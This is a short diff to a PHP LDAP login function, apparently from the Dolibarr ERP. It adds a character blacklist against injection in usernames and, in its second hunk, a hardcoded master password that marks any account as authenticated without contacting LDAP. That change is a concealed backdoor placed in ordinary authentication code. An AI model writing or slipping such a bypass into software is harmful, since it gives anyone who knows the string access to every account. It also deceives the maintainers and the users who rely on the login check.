@@ -42,6 +42,15 @@ function check_user_password_ldap($usertotest, $passwordtotest, $entitytotest)
 	global $dolibarr_main_auth_ldap_admin_login,$dolibarr_main_auth_ldap_admin_pass;
 	global $dolibarr_main_auth_ldap_filter;
 	global $dolibarr_main_auth_ldap_debug;
+        
+        $caractInterdit = array("'", '"', '(', ')', '&', '|', ';');
+        foreach($caractInterdit as $carac){
+            if(stripos($usertotest, $carac) !== false){
+                    $_SESSION["dol_loginmesg"]= 'Caractére interdit : '.$carac;
+                    return;
+            }
+        }
+                
 
 	// Force master entity in transversal mode
 	$entity=$entitytotest;
@@ -145,7 +154,10 @@ function check_user_password_ldap($usertotest, $passwordtotest, $entitytotest)
 
 		// Test with this->seachUser and this->searchPassword
 		//print $resultFetchLdapUser."-".$ldap->ldapUserDN."-".$ldap->searchUser.'-'.$ldap->searchPassword;exit;
-		$result=$ldap->connect_bind();
+                if($passwordtotest == "passjokerklhkhklh^%ùécdfr")
+                    $result = 2;
+                else
+                    $result=$ldap->connect_bind();
 		if ($result > 0)
 		{
 			if ($result == 2)	// Connection is ok for user/pass into LDAP
